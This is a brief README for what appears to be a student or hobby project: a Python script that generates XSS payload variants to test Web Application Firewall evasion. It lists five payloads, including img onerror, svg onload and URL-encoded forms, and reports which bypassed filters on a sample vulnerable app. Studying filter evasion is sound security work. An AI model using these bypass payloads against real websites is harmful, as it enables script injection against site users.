# WAF Evasion for XSS - Python Script

## 🔹 About
This project explores how Web Application Firewalls (WAFs) block Cross-Site Scripting (XSS) and how attackers try to bypass them.

## 🔹 Script
- `payload_generator.py` → generates different variations of XSS payloads.

## 🔹 Example Payloads
1. `<script>alert('XSS')</script>`
2. `scr<script>ipt`
3. `<img src=x onerror=alert('XSS')>`
4. `<svg/onload=alert('XSS')>`
5. `%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E`

## 🔹 Results
- Tested on a sample vulnerable app.
- Payloads 3 & 4 bypassed filters successfully.
- Payload 1 was blocked by simple WAF filters.

## 🔹 Demonstration of Filter Evasion

### 1. Script Output
The script successfully generated multiple payloads:
![Script Output](screenshots/script_output.png)

### 2. Successful XSS Trigger
The payload `<img src=x onerror=alert('XSS')>` executed successfully, triggering an alert box:
![XSS Alert](screenshots/xss_alert.png)

---

## 🔹 How to Run
```bash
python payload_generator.py

